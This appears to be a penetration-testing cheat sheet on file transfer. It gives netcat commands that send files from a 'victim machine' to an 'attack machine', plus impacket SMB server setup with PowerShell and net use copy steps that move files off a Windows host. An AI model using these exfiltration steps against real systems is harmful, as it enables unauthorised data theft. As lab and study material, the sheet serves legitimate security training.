
# File Transfer

## Windows

## Linux

Using netcat :
```bash
# receiver (attack machine)
nc -nvlp <Port> > filename

# sender (victim machine)
nc <IP attack> <Port> < filename
```

## Transfering files from Windows to Linux

### Transfering files by setting up an SMB server with impacket 

Creation an SMB server in the current directory of attack machine : 
```bash
impacket-smbserver -smb2support -username kali -password kali share ./
```

On the windows host, we can either use powershell or net use. 
We start by creating a persistent connection to the smbserver :
```powershell
net use Z: \\<IP>\share /user:kali kali /persistent:yes
```

We copy the file with the `Copy-Item` cmdlet :
```powershell
$sourcePath = "C:\path\to\file.txt"
$destinationPath = "Z:\file.txt"

Copy-Item -Path $sourcePath -Destination $destinationPath
```

If credentials are possible to use : 
```powershell 
# Define the source file, destination path, and credentials
$sourcePath = "C:\path\to\your\file.txt"
$destinationPath = "\\<IP>\share\file.txt"
$username = "kali"
$password = "kali"

# Convert the password to a secure string
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Create a credential object
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

# Copy the file to the SMB share using credentials
Copy-Item -Path $sourcePath -Destination $destinationPath -Credential $credential
```